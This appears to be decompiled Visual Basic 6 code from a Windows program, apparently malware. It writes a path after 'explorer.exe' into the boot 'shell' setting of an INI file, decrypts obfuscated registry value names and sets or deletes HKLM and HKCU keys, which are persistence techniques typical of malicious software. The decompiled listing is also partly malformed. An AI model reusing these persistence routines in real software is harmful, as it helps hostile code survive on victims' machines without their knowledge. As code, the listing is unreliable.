
Public Sub Proc_8_0_4295B0
  var_ret_1 = arg_14
  var_ret_2 = arg_10
  var_ret_3 = arg_C
  var_ret_4 = arg_8
  var_eax = WritePrivateProfileString(var_ret_4, var_ret_3, var_ret_2, var_ret_1)
  var_ret_5 = var_18
  var_ret_6 = var_1C
  var_ret_7 = var_20
  var_ret_8 = var_24
  var_14 = WritePrivateProfileString(var_ret_4, var_ret_3, var_ret_2, var_ret_1)
  GoTo loc_004296A1
  Exit Sub
  loc_004296A1: 
End Sub

Public Sub Proc_8_1_4296C0
  On Error Resume Next
  var_28 = "yLb+$8Ö^o†t~=98Î™∞∞òÅ£àv@S7yöá"
  var_eax = Proc_1_1_4115D0(var_28, global_0042C130, -1)
  var_2C = Proc_1_1_4115D0(var_28, global_0042C130, -1)
  var_3C = 0 & var_2C
  var_eax = Proc_8_0_4295B0("boot", "shell", global_0042C130 & "explorer.exe, " & arg_8)
  GoTo loc_00429811
  Exit Sub
  loc_00429811: 
End Sub

Public Sub Proc_8_2_429830
  var_24 = arg_8
  On Error Resume Next
  var_2C = arg_C & arg_10
  var_30 = arg_C & arg_14
  var_ret_1 = var_2C
  var_eax = RegOpenKeyEx(global_80000002, var_ret_1, 0, 983103, var_34)
  var_4C = RegOpenKeyEx(global_80000002, var_ret_1, 0, 983103, var_34)
  var_ret_2 = var_38
  If var_50 Then
    var_eax = RegCreateKeyEx(global_80000002, var_2C, 0, 0, 0, 983103, 0, var_34, var_28)
    var_ret_4 = var_38
    var_38 = "MGGîbyØxë»¶†&D/ø´ñ≤èçé{u"
    var_eax = Proc_1_1_4115D0(var_38, -1, edi)
    var_48 = Proc_1_1_4115D0(var_38, -1, edi)
    var_eax = RegSetValueEx(var_34, var_48, 0, 1, var_24, Len(var_24), 0)
    var_ret_7 = var_44
    var_eax = RegDeleteKey(global_80000002, var_30)
    var_ret_9 = var_38
    var_eax = RegDeleteKey(global_80000001, var_2C)
    var_ret_B = var_38
    GoTo loc_00429C2B
  End If
  var_eax = RegCreateKeyEx(global_80000002, var_30, 0, 0, 0, 983103, 0, var_34, var_28)
  var_ret_D = var_38
  var_38 = "MGGîbxØxÜ»¶°&D1ø´í≤èåé{p"
  var_eax = Proc_1_1_4115D0(var_38, 0, )
  var_eax = RegSetValueEx(var_34, Proc_1_1_4115D0(var_38, 0, ), 0, 1, var_24, Len(var_24), )
  var_ret_10 = var_44
  var_eax = RegDeleteKey(global_80000002, var_2C)
  var_ret_12 = var_38
  var_eax = RegDeleteKey(global_80000001, var_30)
  var_ret_14 = var_38
  loc_00429C2B: 
  var_eax = RegCloseKey(var_34)
  GoTo loc_00429C68
  Exit Sub
  loc_00429C68: 
End Sub

Public Sub Proc_8_3_429CA0
  var_eax = SHGetSpecialFolderLocation(00000064h, arg_8, var_24)
  If SHGetSpecialFolderLocation(00000064h, arg_8, var_24) = 0 Then
    var_1C = Space$(512)
    var_eax = SHGetPathFromIDListA(var_24, var_1C, GetLastError())
    var_ret_2 = var_2C
    var_2C = Chr$(0)
    InStr(1, var_1C, var_2C, 0) = InStr(1, var_1C, var_2C, 0) - 00000001h
    var_28 = Left$(var_1C, InStr(1, var_1C, var_2C, 0)) & global_00406544
    GoTo loc_00429DE5
  End If
  GoTo loc_00429DE5
  If var_4 Then
  End If
  Exit Sub
  loc_00429DE5: 
End Sub

Public Sub Proc_8_4_429E10
  var_28 = arg_C
  var_24 = arg_10
  On Error Resume Next
  var_eax = RegOpenKey(arg_8, var_28, var_2C)
  var_ret_2 = var_30
  var_eax = RegDeleteValue(var_2C, var_24)
  var_ret_4 = var_30
  var_eax = RegCloseKey(var_2C)
  GoTo loc_00429F1F
  Exit Sub
  loc_00429F1F: 
End Sub

Public Sub Proc_8_5_429F50
  var_28 = arg_C
  var_24 = arg_10
  On Error Resume Next
  var_eax = RegCreateKey(arg_8, var_28, var_2C)
  var_ret_2 = var_30
  var_eax = RegSetValueEx(var_2C, var_24, 0, 4, arg_14, 4, -1)
  var_ret_4 = var_30
  var_eax = RegCloseKey(var_2C)
  GoTo loc_0042A069
  Exit Sub
  loc_0042A069: 
End Sub

Public Sub Proc_8_6_42A090
  var_2C = arg_C
  var_28 = arg_10
  var_24 = arg_14
  On Error Resume Next
  var_eax = RegCreateKey(arg_8, var_2C, var_30)
  var_ret_2 = var_34
  var_eax = RegSetValueEx(var_30, var_28, 0, 1, var_24, Len(var_24), -1)
  var_ret_5 = var_34
  var_ret_6 = var_38
  var_eax = RegCloseKey(var_30)
  GoTo loc_0042A1EB
  Exit Sub
  loc_0042A1EB: 
End Sub
